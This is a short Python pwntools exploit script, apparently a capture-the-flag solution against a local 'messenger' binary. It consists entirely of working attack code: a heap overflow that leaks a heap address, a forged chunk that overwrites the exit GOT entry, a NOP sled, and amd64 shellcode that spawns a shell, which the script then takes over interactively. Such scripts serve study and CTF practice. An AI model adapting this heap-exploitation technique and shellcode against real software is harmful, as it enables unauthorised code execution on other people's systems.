from pwn import *

s=process("./messenger")

def Leave_msg(size,msg):
        print s.recvuntil(">> ")
        s.sendline("L")
        print s.recvuntil("size : ")
        s.sendline(size)
        print s.recvuntil("msg : ")
        s.sendline(msg)

def Remove_msg(index):
        print s.recvuntil(">> ")
        s.sendline("R")
        print s.recvuntil("index : ")
        s.sendline(index)

def Change_msg(index, size, msg):
        print s.recvuntil(">> ")
        s.sendline("C")
        print s.recvuntil("index : ")
        s.sendline(index)
        print s.recvuntil("size : ")
        s.sendline(str(size+1))
        print s.recvuntil("msg : ")
        s.send(msg)

def View_msg(index,until):
        print s.recvuntil(">> ")
        s.sendline("V")
        print s.recvuntil("index : ")
        s.sendline(index)
        print s.recvuntil(until)

Leave_msg("32","AAAA")
Leave_msg("32","BBBB")
Change_msg("0",64,"C"*64)
View_msg("0","C"*64)
heap_leak=u32(s.recv(4))

#amd64 shellcode
shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97"
shellcode+="\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

exit_got=0x602070

payload=""
payload+='\x90'*48
payload+=p64(0x49)
payload+=p64(exit_got-0x10)
payload+=p64(heap_leak+0x60) #0x78
payload+='\xeb\x50' #jmp 0x50 ->jump nops slop
payload+='\x90'*100
payload+=shellcode

Change_msg('0',len(payload),payload)

Remove_msg('1')

print s.recvuntil(">> ")
s.sendline('zj3t') #exit gogo

s.interactive()
